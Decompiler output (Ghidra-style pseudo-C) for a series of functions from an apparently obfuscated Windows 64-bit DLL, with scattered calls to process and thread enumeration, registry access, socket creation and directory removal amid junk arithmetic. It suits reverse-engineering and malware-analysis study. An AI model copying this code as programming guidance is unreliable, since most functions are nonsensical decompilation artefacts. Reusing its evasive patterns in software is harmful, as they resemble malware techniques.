void FUN_18003a538(void)

{
  undefined1 local_30 [16];
  
  GetCursorPos((LPPOINT)(((ulonglong)local_30 >> 8) - 3));
  FUN_18002f158();
  return;
}


```

---

## Function: FUN_18003a620 (0x18003a620)

```c

longlong FUN_18003a620(void)

{
  ulonglong uVar1;
  undefined1 *puVar2;
  
  puVar2 = &stack0xffffffffffffffe8;
  uVar1 = FUN_1800347e0();
  if (uVar1 != 0) {
    puVar2 = (undefined1 *)((ulonglong)puVar2 >> 0x14);
  }
  return uVar1 * ((longlong)puVar2 + 0x19U);
}


```

---

## Function: FUN_18003a6d0 (0x18003a6d0)

```c

undefined8 FUN_18003a6d0(void)

{
  undefined8 unaff_R12;
  
  return unaff_R12;
}


```

---

## Function: FUN_18003a730 (0x18003a730)

```c

longlong FUN_18003a730(void)

{
  undefined1 local_20 [24];
  
  FUN_1800039e8();
  return (longlong)local_20 >> 0x1e;
}


```

---

## Function: FUN_18003a788 (0x18003a788)

```c

/* WARNING: Removing unreachable block (ram,0x00018003a8bb) */

void FUN_18003a788(void)

{
  FUN_180010d90();
  RemoveDirectoryA(&DAT_1800cd501);
  return;
}


```

---

## Function: FUN_18003a8f8 (0x18003a8f8)

```c

undefined8 FUN_18003a8f8(void)

{
  longlong lVar1;
  undefined8 uVar2;
  undefined8 local_28;
  
  lVar1 = FUN_180031578();
  uVar2 = 0;
  if (lVar1 != 0) {
    uVar2 = local_28;
  }
  return uVar2;
}


```

---

## Function: FUN_18003a9f8 (0x18003a9f8)

```c

undefined1 * FUN_18003a9f8(void)

{
  undefined1 *puVar1;
  ulonglong uVar2;
  longlong in_R10;
  ulonglong uVar3;
  
  FUN_180044428();
  uVar3 = in_R10 + 0x10;
  uVar2 = 0;
  FUN_18000dc58();
  puVar1 = FUN_180011bb0();
  if (puVar1 == (undefined1 *)0x0) {
    puVar1 = (undefined1 *)(uVar2 | uVar3);
  }
  return puVar1;
}


```

---

## Function: FUN_18003aad0 (0x18003aad0)

```c

longlong FUN_18003aad0(void)

{
  longlong in_RAX;
  longlong lVar1;
  longlong unaff_RDI;
  longlong in_R11;
  longlong unaff_R12;
  undefined8 local_10;
  
  lVar1 = in_RAX + unaff_R12 + -0x19;
  return ((lVar1 + unaff_RDI + -0x1a) - (ulonglong)CARRY8(local_10,local_10)) *
         lVar1 * in_R11 * 0x20000 + ((local_10 & 0x7fffffffffffffff) >> 0x1b);
}


```

---

## Function: FUN_18003ab70 (0x18003ab70)

```c

void FUN_18003ab70(void)

{
  undefined1 local_48 [16];
  undefined1 local_38 [32];
  
  FUN_18004fe48(local_38,0x1395a2912ca555c5,0,(ulonglong)local_48 | 0x1800ca9d1);
  FUN_180027cb0();
  FUN_180007c80();
  return;
}


```

---

## Function: FUN_18003ad08 (0x18003ad08)

```c

/* WARNING: This function may have set the stack pointer */
/* WARNING: Removing unreachable block (ram,0x00018003adf2) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_18003ad08(void)

{
  FUN_18003be38();
  CreateToolhelp32Snapshot();
  FUN_18000f380();
  _DAT_9a41ca5a = 0x18003af12;
  FUN_180028b98();
  return;
}


```

---

## Function: FUN_18003af48 (0x18003af48)

```c

undefined8 FUN_18003af48(void)

{
  GetCurrentDirectoryW(0x800d11de,(LPWSTR)&DAT_1800bfbe6);
  return 0xacbd54af3e9c20e1;
}


```

---

## Function: FUN_18003b008 (0x18003b008)

```c

void FUN_18003b008(void)

{
  FUN_180010088();
  return;
}


```

---

## Function: FUN_18003b0a0 (0x18003b0a0)

```c

void FUN_18003b0a0(void)

{
  return;
}


```

---

## Function: FUN_18003b100 (0x18003b100)

```c

ulonglong FUN_18003b100(void)

{
  ulonglong in_RAX;
  ulonglong uVar1;
  ulonglong uVar2;
  ulonglong unaff_RDI;
  ulonglong uVar3;
  longlong in_R10;
  ulonglong uVar4;
  ulonglong unaff_R12;
  ulonglong unaff_R13;
  
  uVar3 = unaff_RDI & unaff_R13;
  uVar2 = 0;
  uVar4 = in_R10 + uVar3 | unaff_R13 * uVar3 << 0x33;
  uVar1 = FUN_1800195f8();
  if ((longlong)(uVar4 & (uVar2 ^ (uVar3 | (unaff_R12 | in_RAX) ^ 0x3779431c62969144)) + 0xb) < 0) {
    uVar1 = uVar1 & uVar4;
  }
  return uVar1;
}


```

---

## Function: FUN_18003b1b8 (0x18003b1b8)

```c

longlong FUN_18003b1b8(void)

{
  ulonglong uVar1;
  longlong lVar2;
  undefined1 local_18 [16];
  
  lVar2 = 0;
  uVar1 = FUN_180023630();
  return (uVar1 | (ulonglong)local_18) * (lVar2 + -0x15);
}


```

---

## Function: FUN_18003b218 (0x18003b218)

```c

/* WARNING: Removing unreachable block (ram,0x00018003b291) */

void FUN_18003b218(void)

{
  FUN_180003618();
  return;
}


```

---

## Function: FUN_18003b2c8 (0x18003b2c8)

```c

void FUN_18003b2c8(void)

{
  FUN_18001d590();
  return;
}


```

---

## Function: FUN_18003b350 (0x18003b350)

```c

void FUN_18003b350(void)

{
  FUN_180005c28();
  return;
}


```

---

## Function: FUN_18003b3e0 (0x18003b3e0)

```c

void FUN_18003b3e0(void)

{
  FUN_18000f6d0();
  return;
}


```

---

## Function: FUN_18003b450 (0x18003b450)

```c

/* WARNING: Removing unreachable block (ram,0x00018003b49c) */

void FUN_18003b450(void)

{
  return;
}


```

---

## Function: FUN_18003b4f0 (0x18003b4f0)

```c

longlong FUN_18003b4f0(undefined8 param_1,longlong param_2)

{
  ulonglong in_RAX;
  ulonglong uVar1;
  longlong unaff_RBX;
  ulonglong uVar2;
  longlong unaff_RSI;
  longlong unaff_RDI;
  ulonglong in_R10;
  
  uVar2 = (unaff_RBX >> 2) + param_2 + 0x12;
  uVar1 = in_RAX | in_R10;
  if ((POPCOUNT(uVar2 & 0xff) & 1U) == 0) {
    uVar1 = uVar1 - uVar2;
  }
  if (-1 < unaff_RDI << 6) {
    uVar1 = uVar1 & unaff_RSI + 10U;
  }
  return uVar1 << 0xc;
}


```

---

## Function: FUN_18003b5a0 (0x18003b5a0)

```c

ulonglong FUN_18003b5a0(void)

{
  ulonglong uVar1;
  ulonglong unaff_RBX;
  longlong in_R9;
  ulonglong in_R11;
  
  uVar1 = 0x3a82c98bc6b470c9;
  if ((in_R11 & unaff_RBX) != 0) {
    uVar1 = in_R9 + 0x18U | 0x3eb3ebafe7bf79cf;
  }
  return uVar1;
}


```

---

## Function: FUN_18003b628 (0x18003b628)

```c

void FUN_18003b628(undefined8 param_1,undefined8 param_2,int param_3,int param_4)

{
  HKEY hKey;
  longlong unaff_RBX;
  longlong in_R11;
  PHKEY unaff_R14;
  HKEY__ HStackY_c;
  
  hKey = (HKEY)((longlong)&HStackY_c -
               (ulonglong)(SEXT816(in_R11 * unaff_RBX) != SEXT816(in_R11) * SEXT816(unaff_RBX)));
  RegOpenKeyExW(hKey,(LPCWSTR)hKey,param_3 + 9,param_4 + 0x18,unaff_R14);
  return;
}


```

---

## Function: FUN_18003b6d8 (0x18003b6d8)

```c

undefined8 FUN_18003b6d8(void)

{
  return 0;
}


```

---

## Function: FUN_18003b780 (0x18003b780)

```c

ulonglong FUN_18003b780(void)

{
  char *_Size;
  undefined1 local_58 [16];
  undefined1 local_48 [64];
  undefined1 local_8 [8];
  
  _Size = s_ddmienzjgitbnxnkofzhrnuwjhoof_1800d1be9 + 0x1d;
  WSASocketW(s_ddmienzjgitbnxnkofzhrnuwjhoof_1800d1be9 + 0x1d,s_compressionlev_1800c1cec,local_48,
             local_8);
  malloc((size_t)_Size);
  return (ulonglong)local_58 ^ 0x70eedd76;
}


```

---

## Function: FUN_18003b8a0 (0x18003b8a0)

```c

void FUN_18003b8a0(void)

{
  ulonglong uVar1;
  undefined1 *puVar2;
  ulonglong uVar3;
  LPCWSTR lpSubKey;
  ulonglong unaff_RBX;
  ulonglong uVar4;
  REGSAM samDesired;
  longlong in_R10;
  ulonglong uVar5;
  longlong in_R11;
  ulonglong uVar6;
  longlong lVar7;
  ulonglong unaff_R12;
  bool bVar8;
  undefined1 auStackY_48 [32];
  PHKEY in_stack_ffffffffffffffd8;
  undefined1 local_20 [8];
  
  puVar2 = &stack0xffffffffffffffe8;
  uVar3 = 0xb0f49976d13237fb;
  samDesired = 0x800c581e;
  uVar4 = in_R11 * 2;
  uVar6 = in_R11 - 0xd;
  uVar5 = in_R10 + 0x14;
  bVar8 = false;
  if ((longlong)(uVar6 & unaff_RBX) < 0) {
    uVar6 = in_R11 - 0x2b;
    uVar1 = (-in_R11 | uVar5) + uVar6;
    uVar3 = unaff_R12 ^ 0xb0f49976d13237fb;
    bVar8 = uVar5 < uVar1;
    uVar5 = uVar5 - uVar1;
  }
  lVar7 = (uVar6 - 0x12) - (ulonglong)bVar8;
  if ((longlong)uVar3 < 0) {
    uVar4 = uVar4 + 2;
    unaff_R12 = unaff_R12 - uVar4;
    uVar5 = uVar5 - lVar7;
  }
  uVar6 = lVar7 * unaff_R12;
  lpSubKey = (LPCWSTR)&DAT_1800bb3ed;
  uVar3 = FUN_180047290();
  if (uVar3 == 0) {
    lpSubKey = (LPCWSTR)((ulonglong)lpSubKey >> 0xe);
    uVar3 = (ulonglong)puVar2 ^ uVar6 | unaff_R12;
  }
  uVar4 = uVar4 ^ uVar6;
  uVar3 = unaff_R12 * uVar3 - 0x11;
  if ((POPCOUNT(uVar3 & (ulonglong)auStackY_48 & 0xff) & 1U) == 0) {
    puVar2 = (undefined1 *)((longlong)puVar2 + 0x1e);
    uVar3 = uVar3 | (ulonglong)local_20 | uVar5;
    uVar4 = uVar4 >> 0x15 ^ uVar3;
  }
  RegOpenKeyExW((HKEY)((longlong)puVar2 + uVar3),lpSubKey,(DWORD)uVar4,samDesired,
                in_stack_ffffffffffffffd8);
  return;
}


```

---

## Function: FUN_18003ba30 (0x18003ba30)

```c

/* WARNING: Removing unreachable block (ram,0x00018003ba62) */

longlong FUN_18003ba30(void)

{
  longlong lVar1;
  HANDLE pvVar2;
  ulonglong uVar3;
  undefined1 *puVar4;
  BOOL bInitialState;
  LPCSTR lpName;
  ulonglong in_R11;
  ulonglong uVar5;
  undefined1 local_68 [32];
  longlong local_48;
  longlong local_28;
  
  bInitialState = 0;
  lpName = &DAT_1800cd509;
  uVar3 = 0x7ca8041cd9331703;
  lVar1 = FUN_180014040();
  if (lVar1 != 0) {
    in_R11 = in_R11 ^ uVar3;
  }
  puVar4 = (undefined1 *)0x0;
  uVar3 = uVar3 - 8;
  pvVar2 = CreateEventA((LPSECURITY_ATTRIBUTES)0x0,(BOOL)uVar3,bInitialState,lpName);
  if (pvVar2 == (HANDLE)0x0) {
    puVar4 = local_68 + local_28;
  }
  uVar5 = (in_R11 >> 0x1d) - 0x1b;
  if (-1 < local_48) {
    uVar5 = uVar5 ^ (ulonglong)(puVar4 + 0x10) ^ 0xb9e6b5bea06db250;
  }
  return -4 - (ulonglong)
              ((longlong)(((ulonglong)(uVar3 < uVar5) + 0x1bcb48fc47715b89) * 0x100000) < 0);
}


```

---

## Function: FUN_18003bba0 (0x18003bba0)

```c

/* WARNING: Removing unreachable block (ram,0x00018003bbdb) */

ulonglong FUN_18003bba0(void)

{
  ulonglong uVar1;
  
  uVar1 = FUN_180037dd8();
  if (uVar1 == 0) {
    uVar1 = 0x14;
  }
  return uVar1;
}


```

---

## Function: FUN_18003bc28 (0x18003bc28)

```c

longlong FUN_18003bc28(void)

{
  LSTATUS LVar1;
  undefined4 extraout_var;
  longlong unaff_RBX;
  longlong unaff_R13;
  
  LVar1 = RegFlushKey((HKEY)0x0);
  return CONCAT44(extraout_var,LVar1) * (unaff_R13 >> 0xe) * (unaff_RBX >> 0x18);
}


```

---

## Function: FUN_18003bca8 (0x18003bca8)

```c

longlong FUN_18003bca8(void)

{
  longlong lVar1;
  
  lVar1 = FUN_18003fd28();
  return lVar1 + 0x1c;
}


```

---

## Function: FUN_18003bd40 (0x18003bd40)

```c

void FUN_18003bd40(void)

{
  RemoveDirectoryA(&stack0xffffffffffffffe0);
  return;
}


```

---

## Function: FUN_18003be38 (0x18003be38)

```c

undefined1 * FUN_18003be38(void)

{
  longlong in_RAX;
  longlong lVar1;
  ulonglong uVar2;
  longlong unaff_RBX;
  ulonglong uVar3;
  undefined1 *puVar4;
  undefined *puVar5;
  undefined *puVar6;
  ulonglong in_R10;
  longlong in_R11;
  ulonglong uVar7;
  ulonglong unaff_R13;
  undefined1 auStack_128 [8];
  longlong local_120;
  undefined8 uStack_b0;
  ulonglong local_78;
  undefined1 local_68 [88];
  
  uVar7 = in_R11 + 7;
  puVar4 = local_68;
  uVar3 = unaff_RBX + in_RAX;
  puVar5 = &DAT_1800c5eac;
  uStack_b0 = 0x18003be83;
  lVar1 = FUN_180008d10();
  uVar2 = 0;
  if (lVar1 != 0) {
    unaff_R13 = local_78 - (longlong)puVar5 >> 7;
    puVar4 = (undefined1 *)((ulonglong)puVar4 >> 0xf);
    uVar3 = uVar3 + 0x1c;
    in_R10 = in_R10 >> 0xc;
    uVar7 = unaff_R13 ^ uVar3 ^ in_R10;
    uVar2 = local_78;
  }
  puVar6 = puVar5 + -8;
  if (((ulonglong)puVar6 & uVar2) != 0) {
    puVar6 = puVar6 + (uVar7 + 0x18 + (ulonglong)(puVar5 < (undefined *)0x8) | uVar3);
  }
  if ((unaff_R13 & 0x9a9b33c0) == 0) {
    unaff_R13 = unaff_R13 +
                ((longlong)puVar6 * 0x2000000 - 0x1dU ^
                (longlong)(local_120 - (in_R10 + 0x15 + (longlong)puVar6 * 0x2000000)) >> 10) + 0x18
    ;
  }
  return auStack_128 +
         -(((longlong)puVar4 * 0x1000000 + -4) - (ulonglong)(0xfffffffffffffff8 < unaff_R13));
}


```

---

## Function: FUN_18003bff0 (0x18003bff0)

```c

/* WARNING: This function may have set the stack pointer */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_18003bff0(void)

{
  undefined1 local_30 [8];
  
  FUN_180036988(0xdc3d2697,local_30,0x885afbc3f680640e);
  return;
}


```

---

## Function: FUN_18003c070 (0x18003c070)

```c

longlong FUN_18003c070(undefined8 param_1,undefined8 param_2,longlong param_3)

{
  ulonglong in_RAX;
  ulonglong uVar1;
  ulonglong unaff_RBX;
  ulonglong uVar2;
  ulonglong uVar3;
  ulonglong uVar4;
  ulonglong in_R11;
  longlong local_30;
  ulonglong local_28;
  
  uVar2 = param_3 + 0x13;
  if ((in_R11 & unaff_RBX) != 0) {
    in_RAX = in_RAX - uVar2;
  }
  uVar4 = 0;
  uVar3 = uVar2;
  if ((longlong)in_RAX < 0) {
    uVar3 = uVar2 | (ulonglong)&local_30;
    in_RAX = (in_RAX | in_R11) + 0x11 >> 0x11;
    uVar4 = (uVar2 & in_RAX) << 1;
  }
  uVar2 = local_30 * in_RAX | uVar4;
  if (((uVar3 + 0xd) * 8 & local_28) == 0) {
    uVar1 = local_28 - uVar2;
    uVar2 = uVar2 + uVar1;
    local_28 = uVar1 | uVar4 + 0x24 + (ulonglong)((longlong)((uVar3 + 0xd) * 4) < 0);
  }
  return local_28 + 1 + (ulonglong)(0xfffffffffffffff8 < uVar2);
}


```

---

## Function: FUN_18003c128 (0x18003c128)

```c

ulonglong FUN_18003c128(void)

{
  ulonglong uVar1;
  ulonglong uVar2;
  longlong unaff_RSI;
  longlong unaff_RDI;
  longlong in_R9;
  ulonglong uVar3;
  longlong in_R10;
  ulonglong unaff_R13;
  undefined8 local_20;
  
  uVar3 = in_R9 * unaff_RSI;
  uVar2 = 0xd7a14ddca4ea73e1;
  uVar1 = FUN_180030c50();
  if ((uVar3 & uVar2) == 0) {
    uVar1 = uVar1 - (unaff_RDI + in_R10);
    unaff_R13 = local_20;
  }
  return uVar1 ^ unaff_R13;
}


```

---

## Function: FUN_18003c1d0 (0x18003c1d0)

```c

undefined8 FUN_18003c1d0(void)

{
  return 0x1f50edd31120f1c9;
}


```

---

## Function: FUN_18003c2b8 (0x18003c2b8)

```c

undefined8 FUN_18003c2b8(void)

{
  FUN_180018ee8();
  return 0;
}


```

---

## Function: FUN_18003c368 (0x18003c368)

```c

void FUN_18003c368(void)

{
  ulonglong in_RAX;
  ulonglong unaff_R12;
  
  FUN_18002b1b0(0x770f8ec501e31cef,&DAT_1800d47c2,in_RAX ^ unaff_R12);
  FUN_180011ae8();
  FUN_18000d8c8();
  return;
}


```

---

## Function: FUN_18003c450 (0x18003c450)

```c

/* WARNING: Removing unreachable block (ram,0x00018003c55f) */
/* WARNING: Removing unreachable block (ram,0x00018003c622) */

undefined8 FUN_18003c450(void)

{
  FUN_1800480f8();
  CreateToolhelp32Snapshot(&DAT_1800cd3f9);
  return 0x9df4652b;
}


```

---

## Function: FUN_18003c6b0 (0x18003c6b0)

```c

longlong FUN_18003c6b0(void)

{
  longlong lVar1;
  
  lVar1 = FUN_18003bd40();
  return lVar1 >> 10;
}


```

---

## Function: FUN_18003c778 (0x18003c778)

```c

ulonglong FUN_18003c778(void)

{
  ulonglong uVar1;
  
  uVar1 = FUN_180018890();
  return uVar1 >> 7;
}


```

---

## Function: FUN_18003c808 (0x18003c808)

```c

longlong FUN_18003c808(void)

{
  undefined1 *puVar1;
  ulonglong uVar2;
  longlong unaff_RDI;
  ulonglong uVar3;
  ulonglong uVar4;
  longlong *plVar5;
  longlong lVar6;
  undefined1 *puVar7;
  ulonglong in_R10;
  undefined1 auStack_78 [8];
  undefined8 uStack_70;
  undefined1 local_48 [24];
  longlong local_30 [2];
  
  plVar5 = local_30;
  uStack_70 = 0x18003c851;
  uVar2 = FUN_180041920();
  if (uVar2 == 0) {
    plVar5 = (longlong *)((ulonglong)plVar5 >> 0x17);
  }
  if ((POPCOUNT(uVar2 & 0xff) & 1U) == 0) {
    in_R10 = in_R10 & (ulonglong)plVar5;
    plVar5 = (longlong *)((longlong)plVar5 + 0x19);
  }
  uStack_70 = 0x18003c8c1;
  free((void *)0xa8912ac37b1e6431);
  uVar3 = (unaff_RDI + -0x19) * 0x40000000;
  lVar6 = ((longlong)plVar5 * 0x40000000 + -5) - (ulonglong)((unaff_RDI + -0x19) * 0x20000000 < 0);
  uVar2 = uVar3 | in_R10 >> 10;
  uVar4 = uVar2 + 0x18;
  puVar7 = (undefined1 *)((local_30[0] + -0x1e) - (ulonglong)(0xffffffffffffffe7 < uVar2));
  puVar1 = (undefined1 *)
           ((longlong)local_30 + (longlong)(local_48 + local_30[0] * (longlong)local_48));
  uVar2 = (longlong)local_30 * 0x40000;
  if (-1 < (longlong)
           ((ulonglong)(puVar7 + (ulonglong)(puVar1 < puVar7) + 0x19) &
           (longlong)puVar1 - (longlong)puVar7)) {
    uVar4 = uVar4 ^ (local_30[1] +
                    (ulonglong)
                    (SEXT816((longlong)(lVar6 * uVar3)) != SEXT816(lVar6) * SEXT816((longlong)uVar3)
                    )) - 8;
    uVar2 = uVar2 + 9 | (ulonglong)local_48;
  }
  return uVar2 * uVar4;
}


```

---

## Function: FUN_18003c9d8 (0x18003c9d8)

```c

/* WARNING: Removing unreachable block (ram,0x00018003cba6) */

void FUN_18003c9d8(void)

{
  RemoveDirectoryA((LPCSTR)0x94697e9c);
  FUN_1800253d8();
  FUN_180016370();
  return;
}


```

---

## Function: FUN_18003cbd8 (0x18003cbd8)

```c

undefined8 FUN_18003cbd8(void)

{
  longlong in_RAX;
  undefined1 *puVar1;
  ulonglong unaff_RSI;
  undefined1 *puVar2;
  undefined1 local_30 [24];
  
  puVar1 = local_30;
  puVar2 = puVar1;
  FUN_1800262d0();
  Thread32Next(0x669b1f8cdd8ac2ec,puVar1,(longlong)puVar2 * (unaff_RSI & in_RAX - 0x11U));
  return 0x5fadfa85721747a0;
}


```

---

## Function: FUN_18003cd88 (0x18003cd88)

```c

longlong FUN_18003cd88(void)

{
  longlong lVar1;
  longlong lVar2;
  longlong lVar3;
  undefined1 *puVar4;
  ulonglong unaff_RDI;
  ulonglong uVar5;
  undefined1 local_40 [48];
  undefined1 local_10 [8];
  
  lVar3 = 0xb50fb090128b228;
  uVar5 = 0;
  lVar2 = 0;
  lVar1 = FUN_180037bb8(0,0x128b228);
  if (lVar1 == 0) {
    uVar5 = uVar5 ^ lVar3 + 1 + lVar2;
  }
  puVar4 = local_40;
  lVar1 = FUN_18000d0e8();
  if (puVar4 != (undefined1 *)0x0) {
    lVar1 = (unaff_RDI | 0x15059a1536b17e40) * (longlong)local_10 + uVar5 * 4 + 0x10;
  }
  return lVar1;
}


```

---

